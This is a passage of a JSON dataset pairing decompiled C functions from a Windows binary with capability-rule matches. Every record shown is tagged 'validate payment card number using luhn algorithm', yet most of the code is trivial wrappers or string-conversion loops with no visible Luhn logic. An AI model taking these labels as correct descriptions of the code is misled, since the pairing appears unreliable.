        "decompiled_code": "\nvoid __cdecl fcn.0046e26c(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00401e29(arg_8h, *(in_ECX + 0x14), 0x7ffffffe);\n    return;\n}\n",
        "token_count": 62
    },
    "00403328": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403328(uint *arg_8h, uint arg_ch, uint arg_10h, uint16_t *arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.00406488(*arg_14h);\n            arg_14h = arg_14h + 1;\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 143
    },
    "00404bb5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404bb5(uint *arg_8h, uint arg_ch, uint arg_10h, uint16_t *arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.00401dd4(*arg_14h);\n            arg_14h = arg_14h + 1;\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 145
    },
    "004789f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004789f7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.00404633(arg_8h, arg_ch, arg_10h, arg_14h);\n    if (iVar1 < 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = iVar1 != 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 124
    },
    "00478a34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00478a34(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.0040348b(arg_8h, arg_ch, arg_10h, arg_14h, in_ECX + 8);\n    if (iVar1 < 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = iVar1 != 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 140
    },
    "0047bbdb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0047bbdb(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.0040634d(&arg_ch, &arg_14h, 0, *(in_ECX + 0xc), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x10) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 198
    },
    "0047bc2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0047bc2d(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.0040475f(&arg_ch, &arg_14h, 0, *(in_ECX + 0xc), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x10) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 199
    },
    "0047bf53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0047bf53(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.0040634d(&arg_ch, &arg_14h, 0, *(in_ECX + 8), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x18) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 197
    },
    "0047bfa5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0047bfa5(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.0040475f(&arg_ch, &arg_14h, 0, *(in_ECX + 8), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x18) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 198
    },
    "0047c4b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.0047c4b4(uint16_t *arg_8h, uint16_t *arg_ch, uint arg_10h, uchar *arg_14h)\n\n{\n    uchar uVar1;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.0040319d(*arg_8h, arg_10h);\n            *arg_14h = uVar1;\n            arg_8h = arg_8h + 1;\n            arg_14h = arg_14h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 152
    },
    "0047c501": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.0047c501(uint16_t *arg_8h, uint16_t *arg_ch, uint arg_10h, uchar *arg_14h)\n\n{\n    uchar uVar1;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.00404ba1(*arg_8h, arg_10h);\n            *arg_14h = uVar1;\n            arg_8h = arg_8h + 1;\n            arg_14h = arg_14h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 150
    },
    "0047d335": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.0047d335(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint arg_24h;\n    uint in_ECX;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    arg_24h = fcn.004055b5(&var_44h, 0x40, 0x553db4, arg_1ch);\n    fcn.0040615e(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_44h, arg_24h);\n    fcn.004030bc(var_44h);\n    return;\n}\n",
        "token_count": 209
    },
    "0047db4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.0047db4b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint arg_24h;\n    uint in_ECX;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    arg_24h = fcn.004055b5(&var_44h, 0x40, 0x553db4, arg_1ch);\n    fcn.00403116(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_44h, arg_24h);\n    fcn.004030bc(var_44h);\n    return;\n}\n",
        "token_count": 209
    },
    "0040352b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040352b(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t CodePage;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t arg_14h_00;\n    uint32_t arg_1ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_14h_00 = arg_14h - arg_10h;\n    arg_1ch = arg_ch - arg_8h;\n    if (arg_18h == NULL) {\n        iVar1 = fcn.00403819();\n        iVar1 = *(iVar1 + 4);\n        CodePage = fcn.004055d3();\n    }\n    else {\n        iVar1 = arg_18h[1];\n        CodePage = *arg_18h;\n    }\n    if ((iVar1 == 0) && (CodePage == 0)) {\n        uVar3 = arg_14h_00;\n        if (arg_14h_00 <= arg_1ch) {\n            fcn.00405830(arg_8h, arg_10h, arg_14h_00);\n        }\n    }\n    else {\n        uVar2 = fcn.00402b94(iVar1, 0x400, arg_10h, arg_14h_00, 0, 0, CodePage, 1);\n        uVar3 = 0xffffffff;\n        if ((uVar2 != 0) && (uVar3 = uVar2,  uVar2 <= arg_1ch)) {\n            fcn.00402b94(iVar1, 0x400, arg_10h, arg_14h_00, arg_8h, arg_1ch, CodePage, 1);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 441
    },
    "00405c77": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c77(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_8h;\n    \n    puVar2 = fcn.00404d13(&var_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    uVar1 = puVar2[1];\n    *arg_8h = *puVar2;\n    arg_8h[1] = uVar1;\n    return;\n}\n",
        "token_count": 138
    },
    "004828b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004828b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.004042d2(arg_8h, arg_ch, arg_10h, arg_14h, in_ECX + 8);\n    if (iVar1 < 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = iVar1 != 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 140
    },
    "00483577": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00483577(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.004043c2(&arg_ch, &arg_14h, 0, *(in_ECX + 0xc), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x10) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 197
    },
    "00483733": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00483733(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.004043c2(&arg_ch, &arg_14h, 0, *(in_ECX + 8), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x18) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 196
    },
    "00484149": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00484149(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004042c3(arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 55
    },
    "00484335": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00484335(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00404764(arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 54
    },
    "00484450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00484450(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004042f5(arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 55
    },
    "004911f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004911f3(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00404cfa(arg_8h, arg_ch, arg_10h, arg_14h);\n    return arg_8h;\n}\n",
        "token_count": 68
    },
    "00499281": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00499281(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00404999(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 57
    },
    "004992a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004992a6(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00403675(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004992cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004992cb(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00404999(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 57
    },
    "004992f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004992f0(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00403675(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004aa171": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004aa171(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    fcn.00495bfa(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 96
    },
    "004aa1f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004aa1f8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    fcn.00495dd7(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 98
    },
    "004aafb1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004aafb1(uint *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    fcn.004053fd(*arg_8h, arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 56
    },
    "004abc44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004abc44(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0040605a(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "004abc69": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004abc69(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.00403977(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 57
    },
    "004b05d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004b05d0(uint arg_8h)\n\n{\n    uint arg_ch;\n    \n    arg_ch = fcn.004039e0(1);\n    fcn.00404b1a(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 60
    },
    "004b078f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004b078f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004013d4(arg_8h, 0xffffffff, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 68
    },
    "004bc145": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bc145(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b455e(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "004bc161": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bc161(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b4609(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "004bc17d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bc17d(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b44ac(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "004bc199": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bc199(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b4609(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "00405ebb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ebb(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0040584e(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    return;\n}\n",
        "token_count": 77
    },
    "004bcd16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bcd16(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0040584e(arg_8h, arg_ch, arg_10h, arg_14h, 0, arg_18h);\n    return;\n}\n",
        "token_count": 77
    },
    "004bcd3e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bcd3e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0040584e(arg_8h, arg_ch, arg_10h, arg_14h, 0, 0);\n    return;\n}\n",
        "token_count": 70
    },
    "004063e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004063e8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00404651(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    return;\n}\n",
        "token_count": 77
    },
    "004bf081": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bf081(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00404651(arg_8h, arg_ch, arg_10h, arg_14h, 0, arg_18h);\n    return;\n}\n",
        "token_count": 76
    },
    "004bf0a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004bf0a9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00404651(arg_8h, arg_ch, arg_10h, arg_14h, 0, 0);\n    return;\n}\n",
        "token_count": 70
    },
    "004c412e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c412e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.004051c3(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00404124(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c4236": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c4236(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.004051c3(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00404124(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c433e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c433e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.0040593e(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.004039ef(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c4446": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c4446(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.0040593e(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.004039ef(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c454e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c454e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.004051c3(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00404124(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c45b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c45b6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.004051c3(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00404124(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 121
    },
    "004c45ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c45ea(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.004051c3(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.004062df(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c461e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c461e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.004051c3(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00404124(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c4652": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c4652(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.004051c3(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00404124(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c4686": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c4686(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.0040593e(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.004039ef(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c46ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c46ee(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.0040593e(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.004039ef(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c4722": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c4722(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.0040593e(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00403cd3(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 121
    },
    "004c4756": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c4756(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 0;\n    fcn.0040593e(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.004039ef(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "004c478a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
